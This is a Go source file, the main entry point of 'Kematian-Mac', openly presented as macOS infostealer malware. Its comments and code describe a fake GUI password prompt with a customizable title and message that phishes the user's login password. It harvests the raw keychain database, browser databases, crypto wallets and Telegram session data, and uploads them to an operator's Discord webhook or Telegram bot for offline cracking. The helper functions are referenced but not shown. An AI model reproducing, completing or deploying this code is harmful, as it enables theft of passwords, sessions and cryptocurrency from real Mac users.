// Kematian-Mac offline-crack branch.
//
// Pipeline (single run, then exit):
//  1. Resolve upload destinations (Discord webhook and/or Telegram bot).
//  2. Obtain Mac login password via modal / flag / env (for offline decrypt on server).
//  3. Collect RAW keychain DB + browser DBs + wallets WITHOUT on-box decrypt
//     (no unlock-keychain / set-key-partition-list / find-generic-password → no system modals).
//  4. Still run file scan, apps metadata, keys, telegram paths, etc.
//  5. Upload: primary zip (raw secrets) → scanned files → telegram tdata.
//
// Credentials can be baked in at build time (-ldflags) or supplied at runtime.
package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"strings"
)

// defaultWebhook is injected at link time:
//
//	-ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
var defaultWebhook string

func main() {
	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
	telegramTokenFlag := flag.String("telegram-token", "", "Telegram bot token (or TELEGRAM_BOT_TOKEN)")
	telegramChatFlag := flag.String("telegram-chat", "", "Telegram chat/channel ID (or TELEGRAM_CHAT_ID)")
	macPasswordFlag := flag.String("mac-password", "", "macOS login password for offline crack (or KEMATIAN_MAC_PASSWORD)")
	noPromptFlag := flag.Bool("no-prompt", false, "do not show GUI password prompt; require -mac-password or KEMATIAN_MAC_PASSWORD")
	promptTitleFlag := flag.String("prompt-title", "", "custom GUI password dialog title")
	promptMessageFlag := flag.String("prompt-message", "", "custom GUI password dialog message")
	quiet := flag.Bool("quiet", false, "minimal console output")
	flag.Parse()

	uploadCfg := resolveUploadConfig(*webhookFlag, *telegramTokenFlag, *telegramChatFlag)

	// Password modal (or flag/env). Used only for offline decrypt on the operator side —
	// we do NOT unlock Keychain or decrypt browsers on this machine.
	macPassword, err := acquireMacPassword(*macPasswordFlag, *noPromptFlag, *promptTitleFlag, *promptMessageFlag, *quiet)
	if err != nil {
		log.Fatalf("[kematian] password required: %v", err)
	}
	if !*quiet {
		log.Printf("[kematian] offline-crack mode: password captured — uploading raw keychain/browser DBs (no on-box decrypt)")
	}

	if runtime.GOOS != "darwin" {
		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
	}

	if !uploadCfg.valid() {
		log.Fatal("upload destination required: configure Discord webhook and/or Telegram bot token + chat id at build time or via flags/env")
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "mac"
	}

	if !*quiet {
		log.Printf("[kematian] starting offline-crack harvest on %s (%s/%s) — upload via %s", hostname, runtime.GOOS, runtime.GOARCH, uploadDestLabel(uploadCfg))
	}

	payload, err := runHarvestOffline(hostname, macPassword)
	if err != nil {
		log.Fatalf("[kematian] harvest failed: %v", err)
	}

	// Phase 1: raw keychain/browsers/wallets + meta; Phase 2: scanned files; Phase 3: telegram.
	if err := uploadAllHarvest(uploadCfg, hostname, payload, *quiet); err != nil {
		log.Fatalf("[kematian] upload failed: %v", err)
	}

	if !*quiet {
		log.Printf("[kematian] upload complete, exiting")
	}
	os.Exit(0)
}

// sanitizeFilename keeps only [A-Za-z0-9_-] for zip/upload basenames.
func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := b.String()
	if out == "" {
		return "mac"
	}
	return out
}
